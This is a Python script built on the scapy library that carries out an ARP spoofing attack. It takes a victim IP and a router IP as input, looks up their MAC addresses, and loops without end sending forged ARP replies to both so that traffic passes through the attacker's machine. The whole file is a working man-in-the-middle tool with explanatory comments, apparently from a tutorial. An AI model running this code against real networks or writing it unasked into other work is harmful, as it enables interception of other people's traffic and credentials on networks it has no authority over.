#!/usr/bin/env python
import time
import sys
import scapy.all as scapy
# MAC address function which will return
# the mac_address of the provided ip address


def get_mac(ip):
	# creating an ARP request to the ip address
	arp_request = scapy.ARP(pdst=ip)
	# setting the denstination MAC address to broadcast MAC
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	# combining the ARP packet with the broadcast message
	arp_request_broadcast = broadcast / arp_request
	
	# return a list of MAC addresses with respective
	# MAC addresses and IP addresses.
	answ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
	# we choose the first MAC address and select
	# the MAC address using the field hwsrc
	return answ[0][1].hwsrc


def arp_spoof(target_ip, spoof_ip):
	"""" Here the ARP packet is set to response and
	pdst is set to the target IP 
	either it is for victim or router and the hwdst
	is the MAC address of the IP provided
	and the psrc is the spoofing ip address
	to manipulate the packet"""
	
	packet = scapy.ARP(op=2, pdst=target_ip,
					hwdst=get_mac(target_ip), psrc=spoof_ip)
	scapy.send(packet, verbose=False)


victim_ip = input("victim ip_address:") # taking the victim ip_address
router_ip = input("router ip address:") # taking the router ip address
sent_packets_count = 0 # initializing the packet counter
while True:
	sent_packets_count += 2
	arp_spoof(victim_ip, router_ip)
	arp_spoof(router_ip, victim_ip)
	print("[+] Packets sent " + str(sent_packets_count), end="\r")
	sys.stdout.flush()
	time.sleep(2)
